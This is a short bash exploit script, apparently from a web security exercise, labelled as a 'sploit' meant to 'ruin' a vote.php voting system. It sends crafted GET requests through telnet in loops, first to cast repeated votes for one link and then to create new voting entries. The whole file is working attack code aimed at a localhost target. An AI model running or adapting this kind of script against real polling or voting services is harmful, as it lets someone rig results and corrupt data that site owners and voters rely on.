#!/bin/bash

# A sploit that ruins the voting system.

# initialize
voterName="bob"
urlNum="2"

usage(){
    echo "bad arguments, expected 2 arguments"
    exit 1
}

if [ ${#} -ne 2 ]; then usage; fi

echo "Sploit3: this sploit will ruin the voting system in 2 ways. 1) vote more than one time for a particular link. 2) create new voting entries"

# add votes to a URL
for ((i = 1; i <= 5; i+=1)); do
{
# open up telnet
echo "open ${1} ${2}"
sleep 1

echo "GET http://127.0.0.1:8080/vote.php?voter=${voterName}&urlnum=${urlNum} HTTP/1.0"

echo
echo
#sleep 1

} | telnet > /dev/null
done


# add entries to voting system
for ((i = 1; i<= 5; i+=1)); do
{
# open up telnet
echo "open ${1} ${2}"
sleep 1

echo "GET http://127.0.0.1:8080/vote.php?voter=${voterName}&amp;urlnum=${urlNum} HTTP/1.0"

echo
echo

} | telnet > /dev/null
done

